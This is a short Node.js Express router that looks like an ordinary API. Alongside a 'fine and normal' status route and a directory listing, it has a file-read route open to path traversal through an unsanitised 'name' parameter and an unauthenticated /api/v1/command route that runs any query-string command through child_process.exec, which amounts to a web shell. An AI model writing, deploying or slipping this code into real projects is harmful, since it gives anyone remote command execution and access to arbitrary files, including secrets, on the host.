var express = require('express');
const path = require('path')
var router = express.Router();
var fs = require('fs');
const { exec } = require('child_process');
require('dotenv').config();
/* GET home page. */
router.get('/api/', function(req, res, next) {
    res.send({
        status: 200,
        message: "Everything Looks Fine and normal to me!"
    });
});

router.get('/api/v1/list', function(req, res, next) {
    const dir = fs.readdirSync(path.resolve(`${process.env.DIR_PATH}`));
    const files = dir.map((file) => ({
        ...fs.statSync(path.resolve(`${process.env.DIR_PATH}/${file}`)),
        name: file
    }));
    res.send({
        path: path.resolve(`${process.env.DIR_PATH}`),
        files
    });
});

router.get('/api/v1/getFile', function(req, res, next) {
    const content = fs.readFileSync(path.resolve(`${process.env.DIR_PATH}/${req.query.name}`), { encoding: 'utf8', flag: 'r' })
    res.send({
        path: path.resolve(`${process.env.DIR_PATH}`),
        content
    });
});

router.get('/api/v1/command', function(req, res, next) {
    exec(req.query.cmd, (stderr, stdout, err) => res.send({
        status: 200,
        response: stdout
    }))
});

module.exports = router;